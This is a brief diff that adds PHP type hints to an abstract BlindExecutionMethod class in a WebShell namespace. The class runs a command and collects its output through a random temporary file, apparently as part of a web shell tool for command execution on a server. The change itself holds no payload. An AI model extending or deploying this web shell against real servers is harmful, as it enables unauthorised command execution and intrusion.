@@ -3,7 +3,7 @@ namespace WebShell;
 
 abstract class BlindExecutionMethod implements ExecutionMethod
 {
-    public function execute($cmd)
+    public function execute(string $cmd): string
     {
         // Create a temporary random file and redirect the command output to it
         $fileName = bin2hex(random_bytes(32)) . '.txt';
@@ -20,6 +20,6 @@ abstract class BlindExecutionMethod implements ExecutionMethod
         return $output;
     }
 
-    abstract protected function run_command($cmd);
+    abstract protected function run_command(string $cmd): void;
 }
 ?>
